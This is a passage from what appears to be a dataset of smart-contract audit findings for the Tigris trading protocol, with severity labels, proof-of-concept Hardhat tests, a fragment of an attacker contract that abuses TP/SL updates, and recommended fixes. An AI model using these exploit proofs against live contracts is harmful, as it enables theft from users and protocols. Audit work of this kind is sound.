    constructor(address _trading, address _position){
        trading = ITrading(_trading);
        position = IPosition(_position);
    }

    function closeTrade(
        uint _id,
        PriceData calldata _priceData,
        bytes calldata _signature
    ) public{
        bool _tp = false;
        
        trading.updateTpSl(_tp, _id, _priceData.price, _priceData, _signature, msg.sender);
        trading.limitClose(_id, _tp, _priceData, _signature);

        
    }

}
```

### Recommended Mitigation Steps

Don't allow updating sl or tp and executing `limitClose()` at the same block.







***"
192.md,StopLoss/TakeProfit should be validated again for the new price in `Trading.executeLimitOrder()`,medium,"*Submitted by [hansfriese](https://github.com/code-423n4/2022-12-tigris-findings/issues/512), also found by [bin2chen](https://github.com/code-423n4/2022-12-tigris-findings/issues/353)*

The open price of a stop order might be changed during execution but it doesn't validate StopLoss/TakeProfit for the changed price.

As a result, the executed market order might be closed immediately and there would be an unexpected loss for users.

### Proof of Concept

As we can see from `executeLimitOrder()`, the open price might be changed to the current price for the stop order.

```solidity
File: 2022-12-tigris\contracts\Trading.sol
480:     function executeLimitOrder(
481:         uint _id, 
482:         PriceData calldata _priceData,
483:         bytes calldata _signature
484:     ) 
485:         external
486:     {
487:         unchecked {
488:             _checkDelay(_id, true);
489:             tradingExtension._checkGas();
490:             if (tradingExtension.paused()) revert TradingPaused();
491:             require(block.timestamp >= limitDelay[_id]);
492:             IPosition.Trade memory trade = position.trades(_id);
493:             uint _fee = _handleOpenFees(trade.asset, trade.margin*trade.leverage/1e18, trade.trader, trade.tigAsset, true);
494:             (uint256 _price, uint256 _spread) = tradingExtension.getVerifiedPrice(trade.asset, _priceData, _signature, 0);
495:             if (trade.orderType == 0) revert(""5"");
496:             if (_price > trade.price+trade.price*limitOrderPriceRange/DIVISION_CONSTANT || _price < trade.price-trade.price*limitOrderPriceRange/DIVISION_CONSTANT) revert(""6""); //LimitNotMet
497:             if (trade.direction && trade.orderType == 1) {
498:                 if (trade.price < _price) revert(""6""); //LimitNotMet
499:             } else if (!trade.direction && trade.orderType == 1) {
500:                 if (trade.price > _price) revert(""6""); //LimitNotMet
501:             } else if (!trade.direction && trade.orderType == 2) {
502:                 if (trade.price < _price) revert(""6""); //LimitNotMet
503:                 trade.price = _price;
504:             } else {
505:                 if (trade.price > _price) revert(""6""); //LimitNotMet
506:                 trade.price = _price; //@audit check sl/tp
507:             } 
508:             if(trade.direction) {
509:                 trade.price += trade.price * _spread / DIVISION_CONSTANT;
510:             } else {
511:                 trade.price -= trade.price * _spread / DIVISION_CONSTANT;
512:             }

```
But it doesn't validate sl/tp again for the new price so the order might have an invalid sl/tp.

The new price wouldn't satisfy the sl/tp requirements when the price was changed much from the original price due to the high slippage and the order might be closed immediately by sl or tp in this case.

Originally, the protocol validates stoploss only but I say to validate both of stoploss and takeprofit. (I submitted it as another issue to validate tp as well as sl).

### Recommended Mitigation Steps

Recommend validating sl/tp for the new `trade.price` in `Trading.executeLimitOrder()`.





 >
> Since this issue only affects TP and not SL, I only added a check for that.



***"
192.md,`_handleDeposit` and `_handleWithdraw` do not account for tokens with decimals higher than 18,medium,"*Submitted by [yjrwkk](https://github.com/code-423n4/2022-12-tigris-findings/issues/533), also found by [chaduke](https://github.com/code-423n4/2022-12-tigris-findings/issues/676), [rbserver](https://github.com/code-423n4/2022-12-tigris-findings/issues/674), [0xdeadbeef0x](https://github.com/code-423n4/2022-12-tigris-findings/issues/672), [Tointer](https://github.com/code-423n4/2022-12-tigris-findings/issues/667), [Englave](https://github.com/code-423n4/2022-12-tigris-findings/issues/666), [Avci](https://github.com/code-423n4/2022-12-tigris-findings/issues/593), [Deivitto](https://github.com/code-423n4/2022-12-tigris-findings/issues/581), [0xDecorativePineapple](https://github.com/code-423n4/2022-12-tigris-findings/issues/561), [ak1](https://github.com/code-423n4/2022-12-tigris-findings/issues/536), [Critical](https://github.com/code-423n4/2022-12-tigris-findings/issues/494), [unforgiven](https://github.com/code-423n4/2022-12-tigris-findings/issues/350), [Dinesh11G](https://github.com/code-423n4/2022-12-tigris-findings/issues/215), [izhelyazkov](https://github.com/code-423n4/2022-12-tigris-findings/issues/116), [rvierdiiev](https://github.com/code-423n4/2022-12-tigris-findings/issues/115), [0x4non](https://github.com/code-423n4/2022-12-tigris-findings/issues/105), and [pwnforce](https://github.com/code-423n4/2022-12-tigris-findings/issues/34)*

<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L650> 

<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L675>

### Impact

In `Trading.sol` a [deposit](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L675) or [withdrawal](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L700) of tokens with decimals higher than 18 will always revert.

This is the case e.g. for `NEAR` which is divisible into 10e24 `yocto`

### Proof of Concept

Change [00.Mocks.js#L33](https://github.com/code-423n4/2022-12-tigris/blob/main/deploy/test/00.Mocks.js#L33) to:

    args: [""USDC"", ""USDC"", 24, deployer, ethers.utils.parseUnits(""1000"", 24)]

Then in [07.Trading.js](https://github.com/code-423n4/2022-12-tigris/blob/main/test/07.Trading.js):

    Opening and closing a position with tigUSD output
    Opening and closing a position with <18 decimal token output

are going to fail with:

    Error: VM Exception while processing transaction: reverted with panic code 0x11 (Arithmetic operation underflowed or overflowed outside of an unchecked block)

### Tools Used

VS Code

### Recommended Mitigation Steps

Update calculations in the contract to account for tokens with decimals higher than 18.




***"
192.md,Trading#initiateMarketOrder allows to open a position with more margin than expected due to _handleOpenFees wrong calculation when a trade is referred,medium,"*Submitted by [carlitox477](https://github.com/code-423n4/2022-12-tigris-findings/issues/542), also found by [koxuan](https://github.com/code-423n4/2022-12-tigris-findings/issues/322)*

<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178-L179> 

<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L734-L738>

When `initiateMarketOrder` is called, `_marginAfterFees` are calculated and then used to calculate `_positionSize`:

```solidity
uint256 _marginAfterFees = _tradeInfo.margin - _handleOpenFees(_tradeInfo.asset, _tradeInfo.margin*_tradeInfo.leverage/1e18, _trader, _tigAsset, false);
uint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18;
```

The problem is that `_handleOpenFees` does not consider referrer fees when it calculates its output (paidFees), leading to open a position greater than expected.

### Impact

For a referred trade, `initiateMarketOrder` always opens a position greater than the one supposed, by allowing the use of more margin than the one expected.

### Proof of Concept

The output of `_handleOpenFees` is `_feePaid`, which is calculated [once](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L734-L738), and it does not consider referralFees:

```solidity
// No refferal fees are considered
_feePaid =
    _positionSize
    * (_fees.burnFees + _fees.botFees) // get total fee%
    / DIVISION_CONSTANT // divide by 100%
    + _daoFeesPaid;
```

Then we can notice that, if the output of `_handleOpenFees` did not consider referral fees, neither would `\_marginAfterFees` do:

```solidity
uint256 _marginAfterFees =
    _tradeInfo.margin-
    _handleOpenFees(
        _tradeInfo.asset,
        _tradeInfo.margin*_tradeInfo.leverage/1e18, 
        _trader,
        _tigAsset,
        false);

// @audit Then _positionSize would be greater than what is supposed to be, allowing to create a position greater than expected
uint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18;
```

### Recommended Mitigation steps

Consider referral fees when `_feePaid` is calculated in `_handleOpenFees`:

```diff
// In _handleOpenFees function
+   uint256 _refFeesToConsider = _referrer == address(0) ? 0 : _fees.referralFees;
    _feePaid =
        _positionSize
-       * (_fees.burnFees + _fees.botFees) // get total fee%
+       * (_fees.burnFees + _fees.botFees + _refFeesToConsider) // get total fee%
        / DIVISION_CONSTANT // divide by 100%
        + _daoFeesPaid;
```

 

***"
192.md,`executeLimitOrder()` modifies open-interest with a wrong position value,medium,"*Submitted by [0xA5DF](https://github.com/code-423n4/2022-12-tigris-findings/issues/576), also found by [Jeiwan](https://github.com/code-423n4/2022-12-tigris-findings/issues/437), [KingNFT](https://github.com/code-423n4/2022-12-tigris-findings/issues/431), and [HollaDieWaldfee](https://github.com/code-423n4/2022-12-tigris-findings/issues/137)*

The `PairsContract` registers the total long/short position that's open for a pair of assets, whenever a new position is created, the total grows accordingly.

However at `executeLimitOrder()` the position size that's added is wrongly calculated - it uses margin before fees, while the actual position is created after subtracting fees.

### Impact

The OpenInterest would register wrong values (11% diff in the case of PoC), which will distort the balance between long and short positions (the whole point of the OpenInterest is to balance them to be about equal).

### Proof of Concept

In the following test, an order is created with a x100 leverage, and the position size registered for OI is 11% greater than the actual position created.

```diff
diff --git a/test/07.Trading.js b/test/07.Trading.js
index ebe9948..dfb7f98 100644
--- a/test/07.Trading.js
+++ b/test/07.Trading.js
@@ -778,7 +778,7 @@ describe(""Trading"", function () {
      */
     it(""Creating and executing limit buy order, should have correct price and bot fees"", async function () {
       // Create limit order
-      let TradeInfo = [parseEther(""1000""), MockDAI.address, StableVault.address, parseEther(""10""), 0, true, parseEther(""0""), parseEther(""0""), ethers.constants.HashZero];
+      let TradeInfo = [parseEther(""1000""), MockDAI.address, StableVault.address, parseEther(""100""), 0, true, parseEther(""0""), parseEther(""0""), ethers.constants.HashZero];
       let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];
       await trading.connect(owner).initiateLimitOrder(TradeInfo, 1, parseEther(""20000""), PermitData, owner.address);
       expect(await position.limitOrdersLength(0)).to.equal(1); // Limit order opened
@@ -787,6 +787,9 @@ describe(""Trading"", function () {
       await network.provider.send(""evm_increaseTime"", [10]);
       await network.provider.send(""evm_mine"");
 
+      let count = await position.getCount();
+      let id = count.toNumber() - 1;
+
       // Execute limit order
       let PriceData = [node.address, 0, parseEther(""10000""), 10000000, 2000000000, false]; // 0.1% spread
       let message = ethers.utils.keccak256(
@@ -798,8 +801,22 @@ describe(""Trading"", function () {
       let sig = await node.signMessage(
         Buffer.from(message.substring(2), 'hex')
       );
+      // trading.connect(owner).setFees(true,3e8,1e8,1e8,1e8,1e8);
       
-      await trading.connect(user).executeLimitOrder(1, PriceData, sig);
+
+      let oi = await pairscontract.idToOi(0, stabletoken.address);
+      expect(oi.longOi.toNumber()).to.equal(0);
+      console.log({oi, stable:stabletoken.address});
+
+      await trading.connect(user).executeLimitOrder(id, PriceData, sig);
+      let trade = await position.trades(id);
+      console.log(trade);
+      oi = await pairscontract.idToOi(0, stabletoken.address);
+      console.log(oi);
+
+      expect(oi.longOi.div(10n**18n).toNumber()).to.equal(trade.margin.mul(trade.leverage).div(10n**18n * 10n**18n).toNumber());
+
+
       expect(await position.limitOrdersLength(0)).to.equal(0); // Limit order executed
       expect(await position.assetOpenPositionsLength(0)).to.equal(1); // Creates open position
       expect((await trading.openFees()).botFees).to.equal(2000000);
@@ -807,6 +824,7 @@ describe(""Trading"", function () {
       let [,,,,price,,,,,,,] = await position.trades(1);
       expect(price).to.equal(parseEther(""20020"")); // Should have guaranteed execution price with spread
     });
+    return;
     it(""Creating and executing limit sell order, should have correct price and bot fees"", async function () {
       // Create limit order
       let TradeInfo = [parseEther(""1000""), MockDAI.address, StableVault.address, parseEther(""10""), 0, false, parseEther(""0""), parseEther(""0""), ethers.constants.HashZero];
@@ -1606,6 +1624,7 @@ describe(""Trading"", function () {
       expect(await stabletoken.balanceOf(user.address)).to.equal(parseEther(""1.5""));
     });
   });
+  return;
   describe(""Modifying functions"", function () {
     it(""Updating TP/SL on a limit order should revert"", async function () {
       let TradeInfo = [parseEther(""1000""), MockDAI.address, StableVault.address, parseEther(""10""), 0, true, parseEther(""0""), parseEther(""0""), ethers.constants.HashZero];

```

Output:

    1) Trading
           Limit orders and liquidations
             Creating and executing limit buy order, should have correct price and bot fees:

          AssertionError: expected 100000 to equal 90000
          + expected - actual

          -100000
          +90000

### Recommended Mitigation Steps

Correct the calculation to use margin after fees.






***"
192.md,Unreleased locks cause the reward distribution to be flawed in BondNFT,medium,"*Submitted by [Ruhum](https://github.com/code-423n4/2022-12-tigris-findings/issues/630), also found by [wait](https://github.com/code-423n4/2022-12-tigris-findings/issues/523), [\_\_141345\_\_](https://github.com/code-423n4/2022-12-tigris-findings/issues/399), [rvierdiiev](https://github.com/code-423n4/2022-12-tigris-findings/issues/183), [Ermaniwe](https://github.com/code-423n4/2022-12-tigris-findings/issues/123), and [HollaDieWaldfee](https://github.com/code-423n4/2022-12-tigris-findings/issues/71)*

<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L150> 

<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L225>

### Impact

After a lock has expired, it doesn't get any rewards distributed to it. But, unreleased locks cause other existing bonds to not receive the full amount of tokens either. The issue is that as long as the bond is not released, the `totalShares` value isn't updated. Everybody receives a smaller cut of the distribution. Thus, bond owners receive less rewards than they should.

A bond can be released after it expired by the owner of it. If the owner doesn't release it for 7 days, anybody else can release it as well. As long as the owner doesn't release it, the issue will be in effect for at least 7 epochs.

Since this causes a loss of funds for every bond holder I rate it as HIGH. It's likely to be an issue since you can't guarantee that bonds will be released the day they expire.

### Proof of Concept

Here's a test showcasing the issue:

```js
// 09.Bonds.js

    it.only(""test"", async function () {
      await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther(""100""));
      await lock.connect(owner).lock(StableToken.address, ethers.utils.parseEther(""100""), 100);
      await stabletoken.connect(owner).mintFor(user.address, ethers.utils.parseEther(""1000""));
      await lock.connect(user).lock(StableToken.address, ethers.utils.parseEther(""1000""), 10);
      await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther(""1000""));
      await bond.distribute(stabletoken.address, ethers.utils.parseEther(""1000""));

      await network.provider.send(""evm_increaseTime"", [864000]); // Skip 10 days
      await network.provider.send(""evm_mine"");

      [,,,,,,,pending,,,] = await bond.idToBond(1);
      expect(pending).to.be.equals(""499999999999999999986"");
      [,,,,,,,pending,,,] = await bond.idToBond(2);
      expect(pending).to.be.equals(""499999999999999999986"");


      await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther(""1000""));
      await bond.distribute(stabletoken.address, ethers.utils.parseEther(""1000""));

      await network.provider.send(""evm_increaseTime"", [86400 * 3]); // Skip 3 days
      await network.provider.send(""evm_mine"");

      // Bond 2 expired, so it doesn't receive any of the new tokens that were distributed
      [,,,,,,,pending,,,] = await bond.idToBond(2);
      expect(pending).to.be.equals(""499999999999999999986"");

      // Thus, Bond 1 should get all the tokens, increasing its pending value to 1499999999999999999960
      // But, because bond 2 wasn't released (`totalShares` wasn't updated), bond 1 receives less tokens than it should.
      // Thus, the following check below fails
      [,,,,,,,pending,,,] = await bond.idToBond(1);
      expect(pending).to.be.equals(""1499999999999999999960"");

      await lock.connect(user).release(2);

      expect(await stabletoken.balanceOf(user.address)).to.be.equals(""1499999999999999999986"");

    });
```

The `totalShares` value is only updated after a lock is released:

```sol
    function release(
        uint _id,
        address _releaser
    ) external onlyManager() returns(uint amount, uint lockAmount, address asset, address _owner) {
        Bond memory bond = idToBond(_id);
        require(bond.expired, ""!expire"");
        if (_releaser != bond.owner) {
            unchecked {
                require(bond.expireEpoch + 7 < epoch[bond.asset], ""Bond owner priority"");
            }
        }
        amount = bond.amount;
        unchecked {
            totalShares[bond.asset] -= bond.shares;
        // ... 
```

### Recommended Mitigation Steps

Only shares belonging to an active bond should be used for the distribution logic.






***"
192.md,"Governance NFT holder, whose NFT was minted before `Trading._handleOpenFees` function is called, can lose deserved rewards after `Trading._handleOpenFees` function is called",medium,"*Submitted by [rbserver](https://github.com/code-423n4/2022-12-tigris-findings/issues/649), also found by [HE1M](https://github.com/code-423n4/2022-12-tigris-findings/issues/671), [bin2chen](https://github.com/code-423n4/2022-12-tigris-findings/issues/337), [unforgiven](https://github.com/code-423n4/2022-12-tigris-findings/issues/324), [cccz](https://github.com/code-423n4/2022-12-tigris-findings/issues/299), [KingNFT](https://github.com/code-423n4/2022-12-tigris-findings/issues/285), and [stealthyz](https://github.com/code-423n4/2022-12-tigris-findings/issues/256)*

<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L689-L750> 

<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L762-L810> 

<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L287-L294>

### Impact

Calling the following `Trading._handleOpenFees` function does not approve the `GovNFT` contract for spending any of the `Trading` contract's `_tigAsset` balance, which is unlike calling the `Trading._handleCloseFees` function below that executes `IStable(_tigAsset).approve(address(gov), type(uint).max)`. Due to this lack of approval, when calling the `Trading._handleOpenFees` function without the `Trading._handleCloseFees` function being called for the same `_tigAsset` beforehand, the `GovNFT.distribute` function's execution of `IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount)` in the `try...catch...` block will not transfer any `_tigAsset` amount as the trade's DAO fees to the `GovNFT` contract. 

In this case, although the Governance NFT holder, whose NFT was minted before the `Trading._handleOpenFees` function is called, deserves the rewards from the DAO fees generated by the trade, this holder does not have any pending rewards after such `Trading._handleOpenFees` function call because none of the DAO fees were transferred to the `GovNFT` contract. Hence, this Governance NFT holder loses the rewards that she or he is entitled to.

<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L689-L750>

```solidity
    function _handleOpenFees(
        uint _asset,
        uint _positionSize,
        address _trader,
        address _tigAsset,
        bool _isBot
    )
        internal
        returns (uint _feePaid)
    {
        ...
        unchecked {
            uint _daoFeesPaid = _positionSize * _fees.daoFees / DIVISION_CONSTANT;
            ...
            IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);
        }
        gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));
    }
```

<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L762-L810>

```solidity
    function _handleCloseFees(
        uint _asset,
        uint _payout,
        address _tigAsset,
        uint _positionSize,
        address _trader,
        bool _isBot
    )
        internal
        returns (uint payout_)
    {
        ...
        IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);
        IStable(_tigAsset).approve(address(gov), type(uint).max);
        gov.distribute(_tigAsset, _daoFeesPaid);
        return payout_;
    }
```

<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L287-L294>

```solidity
    function distribute(address _tigAsset, uint _amount) external {
        if (assets.length == 0 || assets[assetsIndex[_tigAsset]] == address(0) || totalSupply() == 0 || !_allowedAsset[_tigAsset]) return;
        try IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount) {
            accRewardsPerNFT[_tigAsset] += _amount/totalSupply();
        } catch {
            return;
        }
    }
```

### Proof of Concept

Functions like `Trading.initiateMarketOrder` further call the `Trading._handleOpenFees` function so this POC uses the `Trading.initiateMarketOrder` function.

Please add the following test in the `Signature verification` `describe` block in `test\07.Trading.js`. This test will pass to demonstrate the described scenario. Please see the comments in this test for more details.

```typescript
    it.only(""Governance NFT holder, whose NFT was minted before initiateMarketOrder function is called, can lose deserved rewards after initiateMarketOrder function is called"", async function () {
      let TradeInfo = [parseEther(""1000""), MockDAI.address, StableVault.address, parseEther(""10""), 0, true, parseEther(""30000""), parseEther(""10000""), ethers.constants.HashZero];
      let PriceData = [node.address, 0, parseEther(""20000""), 0, 2000000000, false];
      let message = ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
          [node.address, 0, parseEther(""20000""), 0, 2000000000, false]
        )
      );
      let sig = await node.signMessage(
        Buffer.from(message.substring(2), 'hex')
      );
      
      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];

      // one Governance NFT is minted to owner before initiateMarketOrder function is called
      const GovNFT = await deployments.get(""GovNFT"");
      const govnft = await ethers.getContractAt(""GovNFT"", GovNFT.address);
      await govnft.connect(owner).mint();

      // calling initiateMarketOrder function attempts to send 10000000000000000000 tigAsset as DAO fees to GovNFT contract
      await expect(trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address))
        .to.emit(trading, 'FeesDistributed')
        .withArgs(stabletoken.address, ""10000000000000000000"", ""0"", ""0"", ""0"", ethers.constants.AddressZero);

      // another Governance NFT is minted to owner and then transferred to user after initiateMarketOrder function is called
      await govnft.connect(owner).mint();
      await govnft.connect(owner).transferFrom(owner.getAddress(), user.getAddress(), 1);

      // user's pending reward amount should be 0 because her or his Governance NFT was minted after initiateMarketOrder function was called
      expect(await govnft.pending(user.getAddress(), stabletoken.address)).to.equal(""0"");

      // owner's Governance NFT was minted before initiateMarketOrder function was called so her or his pending reward amount should be 10000000000000000000.
      // However, owner's pending reward amount is still 0 because DAO fees were not transferred to GovNFT contract successfully.
      expect(await govnft.pending(owner.getAddress(), stabletoken.address)).to.equal(""0"");
    });
```

Furthermore, as a suggested mitigation, please add `IStable(_tigAsset).approve(address(gov), type(uint).max);` in the `_handleOpenFees` function as follows in line 749 of `contracts\Trading.sol`.

```solidity
689:     function _handleOpenFees(
690:         uint _asset,
691:         uint _positionSize,
692:         address _trader,
693:         address _tigAsset,
694:         bool _isBot
695:     )
696:         internal
697:         returns (uint _feePaid)
698:     {
699:         IPairsContract.Asset memory asset = pairsContract.idToAsset(_asset);
...
732:         unchecked {
733:             uint _daoFeesPaid = _positionSize * _fees.daoFees / DIVISION_CONSTANT;
734:             _feePaid =
735:                 _positionSize
736:                 * (_fees.burnFees + _fees.botFees) // get total fee%
737:                 / DIVISION_CONSTANT // divide by 100%
738:                 + _daoFeesPaid;
739:             emit FeesDistributed(
740:                 _tigAsset,
741:                 _daoFeesPaid,
742:                 _positionSize * _fees.burnFees / DIVISION_CONSTANT,
743:                 _referrer != address(0) ? _positionSize * _fees.referralFees / DIVISION_CONSTANT : 0,
744:                 _positionSize * _fees.botFees / DIVISION_CONSTANT,
745:                 _referrer
746:             );
747:             IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);
748:         }
749:         IStable(_tigAsset).approve(address(gov), type(uint).max);   // @audit add this line of code for POC purpose
750:         gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));
751:     }
```

Then, as a comparison, the following test can be added in the `Signature verification` `describe` block in `test\07.Trading.js`. This test will pass to demonstrate that the Governance NFT holder's pending rewards is no longer 0 after implementing the suggested mitigation. Please see the comments in this test for more details.

```typescript
    it.only(`If calling initiateMarketOrder function can correctly send DAO fees to GovNFT contract, Governance NFT holder, whose NFT was minted before initiateMarketOrder function is called,
             can receive deserved rewards after initiateMarketOrder function is called`, async function () {
      let TradeInfo = [parseEther(""1000""), MockDAI.address, StableVault.address, parseEther(""10""), 0, true, parseEther(""30000""), parseEther(""10000""), ethers.constants.HashZero];
      let PriceData = [node.address, 0, parseEther(""20000""), 0, 2000000000, false];
      let message = ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
          [node.address, 0, parseEther(""20000""), 0, 2000000000, false]
        )
      );
      let sig = await node.signMessage(
        Buffer.from(message.substring(2), 'hex')
      );
      
      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];

      // one Governance NFT is minted to owner before initiateMarketOrder function is called
      const GovNFT = await deployments.get(""GovNFT"");
      const govnft = await ethers.getContractAt(""GovNFT"", GovNFT.address);
      await govnft.connect(owner).mint();

      // calling initiateMarketOrder function attempts to send 10000000000000000000 tigAsset as DAO fees to GovNFT contract
      await expect(trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address))
        .to.emit(trading, 'FeesDistributed')
        .withArgs(stabletoken.address, ""10000000000000000000"", ""0"", ""0"", ""0"", ethers.constants.AddressZero);

      // another Governance NFT is minted to owner and then transferred to user after initiateMarketOrder function is called
      await govnft.connect(owner).mint();
      await govnft.connect(owner).transferFrom(owner.getAddress(), user.getAddress(), 1);

      // user's pending reward amount should be 0 because her or his Governance NFT was minted after initiateMarketOrder function was called
      expect(await govnft.pending(user.getAddress(), stabletoken.address)).to.equal(""0"");

      // If calling initiateMarketOrder function can correctly send DAO fees to GovNFT contract, owner's pending reward amount should be 10000000000000000000
      //   because her or his Governance NFT was minted before initiateMarketOrder function was called.
      expect(await govnft.pending(owner.getAddress(), stabletoken.address)).to.equal(""10000000000000000000"");
    });
```

### Tools Used

VS Code

### Recommended Mitigation Steps

<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L749> can be updated to the following code.

```solidity
        IStable(_tigAsset).approve(address(gov), type(uint).max);
        gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));
```

 >
> Valid but I think it should be low risk as it will mostly not affect anyone. 
>
> Also the funds that are not distributed will be distributed later because of  `gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));` so no funds will be lost.
> 





***"
192.md,Chainlink price feed is not sufficiently validated and can return stale price,medium,"*Submitted by [rbserver](https://github.com/code-423n4/2022-12-tigris-findings/issues/655), also found by [eierina](https://github.com/code-423n4/2022-12-tigris-findings/issues/654), [0x52](https://github.com/code-423n4/2022-12-tigris-findings/issues/647), [kwhuo68](https://github.com/code-423n4/2022-12-tigris-findings/issues/624), [joestakey](https://github.com/code-423n4/2022-12-tigris-findings/issues/466), [ladboy233](https://github.com/code-423n4/2022-12-tigris-findings/issues/448), [Jeiwan](https://github.com/code-423n4/2022-12-tigris-findings/issues/430), [\_\_141345\_\_](https://github.com/code-423n4/2022-12-tigris-findings/issues/405), [bin2chen](https://github.com/code-423n4/2022-12-tigris-findings/issues/349), [yixxas](https://github.com/code-423n4/2022-12-tigris-findings/issues/284), [koxuan](https://github.com/code-423n4/2022-12-tigris-findings/issues/278), [8olidity](https://github.com/code-423n4/2022-12-tigris-findings/issues/225), [0xdeadbeef0x](https://github.com/code-423n4/2022-12-tigris-findings/issues/199), [fs0c](https://github.com/code-423n4/2022-12-tigris-findings/issues/187), [0xDecorativePineapple](https://github.com/code-423n4/2022-12-tigris-findings/issues/178), [Rolezn](https://github.com/code-423n4/2022-12-tigris-findings/issues/165), [rvierdiiev](https://github.com/code-423n4/2022-12-tigris-findings/issues/121), and [gzeon](https://github.com/code-423n4/2022-12-tigris-findings/issues/22)*

As mentioned by <https://docs.tigris.trade/protocol/oracle>, ""Prices provided by the oracle network are also compared to Chainlink's public price feeds for additional security. If prices have more than a 2% difference the transaction is reverted."" The Chainlink price verification logic in the following `TradingLibrary.verifyPrice` function serves this purpose. However, besides that `IPrice(_chainlinkFeed).latestAnswer()` uses Chainlink's deprecated `latestAnswer` function, this function also does not guarantee that the price returned by the Chainlink price feed is not stale. When `assetChainlinkPriceInt != 0` is `true`, it is still possible that `assetChainlinkPriceInt` is stale in which the Chainlink price verification would compare the off-chain price against a stale price returned by the Chainlink price feed. For a off-chain price that has more than a 2% difference when comparing to a more current price returned by the Chainlink price feed, this off-chain price can be incorrectly considered to have less than a 2% difference when comparing to a stale price returned by the Chainlink price feed. As a result, a trading transaction that should revert can go through, which makes the price verification much less secure.

<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/utils/TradingLibrary.sol#L91-L122>

```solidity
    function verifyPrice(
        uint256 _validSignatureTimer,
        uint256 _asset,
        bool _chainlinkEnabled,
        address _chainlinkFeed,
        PriceData calldata _priceData,
        bytes calldata _signature,
        mapping(address => bool) storage _isNode
    )
        external view
    {
        ...
        if (_chainlinkEnabled && _chainlinkFeed != address(0)) {
            int256 assetChainlinkPriceInt = IPrice(_chainlinkFeed).latestAnswer();
            if (assetChainlinkPriceInt != 0) {
                uint256 assetChainlinkPrice = uint256(assetChainlinkPriceInt) * 10**(18 - IPrice(_chainlinkFeed).decimals());
                require(
                    _priceData.price < assetChainlinkPrice+assetChainlinkPrice*2/100 &&
                    _priceData.price > assetChainlinkPrice-assetChainlinkPrice*2/100, ""!chainlinkPrice""
                );
            }
        }
    }
```

Based on <https://docs.chain.link/docs/historical-price-data>, the following can be done to avoid using a stale price returned by the Chainlink price feed.

1.  The `latestRoundData` function can be used instead of the deprecated `latestAnswer` function.
2.  `roundId` and `answeredInRound` are also returned. ""You can check `answeredInRound` against the current `roundId`. If `answeredInRound` is less than `roundId`, the answer is being carried over. If `answeredInRound` is equal to `roundId`, then the answer is fresh.""
3.  ""A read can revert if the caller is requesting the details of a round that was invalid or has not yet been answered. If you are deriving a round ID without having observed it before, the round might not be complete. To check the round, validate that the timestamp on that round is not 0.""

### Proof of Concept

The following steps can occur for the described scenario.

1.  Alice calls the `Trading.initiateMarketOrder` function, which eventually calls the `TradingLibrary.verifyPrice` function, to initiate a market order.
2.  When the `TradingLibrary.verifyPrice` function is called, the off-chain price is compared to the price returned by the Chainlink price feed for the position asset.
3.  The price returned by the Chainlink price feed is stale, and the off-chain price has less than a 2% difference when comparing to this stale price.
4.  Alice's `Trading.initiateMarketOrder` transaction goes through. However, this transaction should revert because the off-chain price has more than a 2% difference if comparing to a more current price returned by the Chainlink price feed.

### Tools Used

VS Code

### Recommended Mitigation Steps

<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/utils/TradingLibrary.sol#L113> can be updated to the following code.

```solidity
            (uint80 roundId, int256 assetChainlinkPriceInt, , uint256 updatedAt, uint80 answeredInRound) = IPrice(_chainlinkFeed).latestRoundData();
            require(answeredInRound >= roundId, ""price is stale"");
            require(updatedAt > 0, ""round is incomplete"");
```






***"
65.md,Wrong fee calculation after `totalSupply` was 0,high,"`handleFees` does not update `lastFee` if `startSupply == 0`.
This means that wrongly, extra fee tokens would be minted once the basket is resupplied and `handleFees` is called again.

### Impact

Loss of user funds.
